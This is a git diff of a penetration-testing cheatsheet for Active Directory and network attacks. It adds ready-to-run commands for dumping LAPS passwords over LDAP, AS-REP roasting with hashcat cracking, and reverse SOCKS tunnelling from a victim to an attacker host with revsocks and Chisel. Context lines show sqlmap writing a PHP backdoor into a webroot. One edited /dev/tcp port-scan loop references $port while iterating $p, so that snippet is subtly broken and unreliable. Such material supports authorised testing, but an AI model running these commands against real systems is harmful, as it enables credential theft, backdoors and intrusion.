@@ -161,6 +161,8 @@ user@remote:$ export TERM=xterm
 
 ### Windows
 
+* [github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py)
+
 Local file to base64:
 
 ```
@@ -359,38 +361,56 @@ root@kali:$ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass=qw
 Basic syntax:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -x -s <SCOPE> -b <BASE_DN> <QUERY> <FILTER> <FILTER> <FILTER>
+$ ldapsearch -h 127.0.0.1 -x -s <SCOPE> -b <BASE_DN> <QUERY> <FILTER> <FILTER> <FILTER>
 ```
 
 Get base naming contexts:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -x -s base namingcontexts
+$ ldapsearch -h 127.0.0.1 -x -s base namingcontexts
 ```
 
 Extract data for the whole domain catalog and then grep your way through:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -x -s sub -b "DC=example,DC=local" |tee ldap.out
-root@kali:$ cat ldap.out |grep -i memberof
+$ ldapsearch -h 127.0.0.1 -x -s sub -b "DC=example,DC=local" |tee ldap.out
+$ cat ldap.out |grep -i memberof
 ```
 
 Or filter out only what you need:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -x -b "DC=example,DC=local" '(objectClass=User)' sAMAccountName sAMAccountType
+$ ldapsearch -h 127.0.0.1 -x -b "DC=example,DC=local" '(objectClass=User)' sAMAccountName sAMAccountType
 ```
 
 Get `Remote Management Users` group:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -x -b "DC=example,DC=local" '(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=example,DC=local)' |grep -i memberof
+$ ldapsearch -h 127.0.0.1 -x -b "DC=example,DC=local" '(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=example,DC=local)' |grep -i memberof
 ```
 
 Dump LAPS passwords:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -x -b "dc=example,dc=local" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
+$ ldapsearch -h 127.0.0.1 -x -b "dc=example,dc=local" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
+```
+
+Simple authentication with ldapsearch:
+
+```
+$ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=example,DC=local' -w 'passw0rd' -s sub -b 'DC=example,DC=local' |tee ldapsearch.log
+```
+
+
+
+### windapsearch
+
+* [github.com/ropnop/windapsearch](https://github.com/ropnop/windapsearch)
+
+Enumerate all AD Computers:
+
+```
+./windapsearch.py -u 'example.local\snovvcrash' -p 'passw0rd' --dc 127.0.0.1 -C
 ```
 
 
@@ -477,8 +497,9 @@ root@kali:$ samrdump.py 127.0.0.1
 `GetNPUsers.py`:
 
 ```
-root@kali:$ GetNPUsers.py EXAMPLE.LOCAL/ -dc-ip 127.0.0.1 -k -no-pass -usersfile users.txt -request -format john -outputfile asrep.hash
-root@kali:$ john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt
+$ GetNPUsers.py EXAMPLE.LOCAL/ -dc-ip 127.0.0.1 -k -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile hash.asprep |tee GetNPUsers.log
+$ cat GetNPUsers.log |grep -v 'Client not found in Kerberos database'
+$ ./hashcat64.exe -m 18200 -a 0 -r rules/best64.rule hashes/hash.asprep seclists/Passwords/*
 ```
 
 Show domain users with `DONT_REQ_PREAUTH` flag with `PowerView.ps1`:
@@ -488,7 +509,7 @@ PS> . ./PowerView.ps1
 PS> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 ```
 
-1. [PayloadsAllTheThings/Active Directory Attack.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#krb_as_rep-roasting)
+1. [PayloadsAllTheThings/Active Directory Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#krb_as_rep-roasting)
 
 
 
@@ -786,7 +807,13 @@ $ pypykatz lsa minidump lsass.dmp
 
 ### Responder
 
-Responder SMB-SSP (Security Support Provider) capture structure:
+`[SMB] NTLMv1 Hash` and `[SMB] NTLMv1-SSP Hash` capture structure:
+
+```
+`<Username>:<Domain>:<LMv1_Response>:<NTv1_Response>:<Server_Challenge>`
+```
+
+`[SMB] NTLMv2-SSP Hash` capture structure:
 
 ```
 <Username>:<Domain>:<Server_Challenge>:<LMv2_Response>:<NTv2_Response>
@@ -1129,7 +1156,7 @@ root@kali:$ sqlmap -r request.req --batch -p <PARAM_NAME> --os windows --dbms my
 root@kali:$ sqlmap -r request.req --batch --file-write=./backdoor.php --file-dest=C:/Inetpub/wwwroot/backdoor.php
 ```
 
-* [PayloadsAllTheThings/SQL Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)
+* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)
 
 
 
@@ -1558,9 +1585,14 @@ Dicts:
 
 ## Pivoting
 
+* [PayloadsAllTheThings/Network Pivoting Techniques.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
+
 
 
 ### Chisel
+
+1. [github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
+2. [snovvcrash.rocks/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.rocks/2020/03/17/htb-reddish.html#chisel-socks)
 
 Reverse forward port 1111 from Windows machine to port 2222 on Linux machine:
 
@@ -1588,8 +1620,16 @@ Socks5 proxy with Chisel:
 4. root@kali:$ ./chisel client 127.0.0.1:8001 1080:socks
 ```
 
-1. [github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
-2. [snovvcrash.rocks/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.rocks/2020/03/17/htb-reddish.html#chisel-socks)
+
+
+### revsocks
+
+* [github.com/kost/revsocks](https://github.com/kost/revsocks)
+
+```
+1. root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass passw0rd
+2. user@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass passw0rd
+```
 
 
 
@@ -1774,7 +1814,7 @@ PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogo
 
 ## PrivEsc
 
-* [PayloadsAllTheThings/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+* [PayloadsAllTheThings/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 
 
@@ -2026,6 +2066,8 @@ root@kali:$ netdiscover -i eth0 -r 192.168.0.1/24 -c 20
 
 ### Hunt for Subnets
 
+* [hub.packtpub.com/optimize-scans/](https://hub.packtpub.com/optimize-scans/)
+
 Take `10.0.0.0/8` as an example:
 
 ```
@@ -2157,7 +2199,7 @@ root@kali:$ ln -s ~/tools/parsenmap-py/parsenmap.py /usr/local/bin/parsenmap.py
 Echo:
 
 ```
-root@kali:$ IP="0.0.0.0"; for p in $(seq 1 65535); do (echo '.' > /dev/tcp/$IP/$p && echo "$IP:$p" >> hosts/ports.txt &) 2>/dev/null; done
+root@kali:$ IP="0.0.0.0"; for p in $(seq 1 65535); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$port && echo OPEN:$port" >> hosts/ports.txt &) 2>/dev/null; done
 root@kali:$ sort -u -t':' -k1,1n hosts/ports.txt > hosts/echo-ports.txt && rm hosts/ports.txt
 ```
 
